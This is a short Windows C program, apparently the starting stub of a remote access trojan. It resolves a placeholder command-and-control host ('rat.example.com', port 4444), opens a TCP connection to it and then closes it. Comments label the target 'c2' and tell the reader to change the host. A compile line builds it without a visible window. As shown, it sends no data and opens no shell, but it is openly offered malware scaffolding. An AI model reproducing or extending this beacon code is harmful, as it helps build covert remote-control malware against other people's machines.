#include <winsock2.h>
#include <ws2tcpip.h>  // for getaddrinfo
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET s;
    struct addrinfo hints, *result = NULL;
    int ret;

    const char* domain = "rat.example.com"; // !!!!! change this
    const char* port = "4444";

    // create winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;        //ipv4
    hints.ai_socktype = SOCK_STREAM;  //tcp

    ret = getaddrinfo(domain, port, &hints, &result);
    if (ret != 0) {
        WSACleanup();
        return 0;
    }

    // create socket
    s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (s == INVALID_SOCKET) {;
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }

    // Connect to c2
    ret = connect(s, result->ai_addr, (int)result->ai_addrlen);
    if (ret == SOCKET_ERROR) {
        closesocket(s);
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }

    freeaddrinfo(result);
    closesocket(s);
    WSACleanup();

    return 0;
}

// compile: cl /O2 /SUBSYSTEM:WINDOWS yourprogram.c ws2_32.lib